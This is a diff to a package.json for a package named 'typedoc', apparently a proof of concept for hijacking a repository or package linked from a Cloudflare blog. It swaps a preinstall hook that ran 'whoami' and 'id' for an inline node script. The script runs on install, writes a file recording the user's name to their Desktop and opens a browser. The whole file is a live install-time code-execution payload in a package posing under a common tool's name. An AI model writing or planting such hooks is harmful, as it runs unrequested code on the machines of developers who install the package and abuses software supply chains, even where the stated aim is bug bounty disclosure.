@@ -1,9 +1,9 @@
 {
   "name": "typedoc",
   "version": "1.0.0",
-  "description": "Inert bug bounty proof of concept for Cloudflare. Demonstrating safe RCE.",
+  "description": "Cross-platform visual RCE PoC",
   "main": "index.js",
   "scripts": {
-    "preinstall": "echo '=== BUG BOUNTY POC: ACE ACHIEVED ===' && whoami && id"
+    "preinstall": "node -e \"const fs = require('fs'); const os = require('os'); const path = require('path'); const { exec } = require('child_process'); const desktop = path.join(os.homedir(), 'Desktop'); const filePath = path.join(desktop, 'CLOUDFLARE_RCE_POC.txt'); fs.writeFileSync(filePath, 'RCE Achieved via Cloudflare Blog RepoJacking! Target context: ' + os.userInfo().username); const cmd = os.platform() === 'win32' ? 'start' : os.platform() === 'darwin' ? 'open' : 'xdg-open'; exec(`${cmd} https://cloudflare.com || echo Done`);\""
   }
 }
